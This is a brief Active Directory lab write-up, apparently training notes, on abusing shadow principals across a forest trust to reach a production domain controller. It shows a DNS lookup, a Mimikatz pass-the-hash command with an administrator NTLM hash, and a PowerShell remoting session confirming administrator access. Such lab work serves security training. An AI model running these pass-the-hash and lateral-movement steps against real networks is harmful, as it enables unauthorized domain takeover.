# Abusing Shadow Principals
- We can access `PRODUCTION-DC` from `us.techcorp.local` using **winrs**. First we need to find the IP address of the target DC on `BASTION-DC`, since `techcorp.local` does not have a DNS entry for the target domain.
```powershell
PS C:\Windows\Tasks> nslookup production.local
nslookup production.local
Non-authoritative answer:
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  ::1

Name:    production.local
Address:  192.168.102.1
```
- We need to impersonate `bastion\Administrator` while simultaneously creating a new PowerShell process. We will have to do it using **Mimikatz** or **Safetykatz** because **Rubeus** will not work.
```powershell
PS C:\Auditor> .\mimikatz.exe "sekurlsa::pth /user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"

```
- We can now access `PRODUCTION-DC`.
```powershell
PS C:\Windows\system32> Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
[192.168.102.1]: PS C:\Users\Administrator.BASTION\Documents> whoami;hostname
bastion\administrator
Production-DC
```
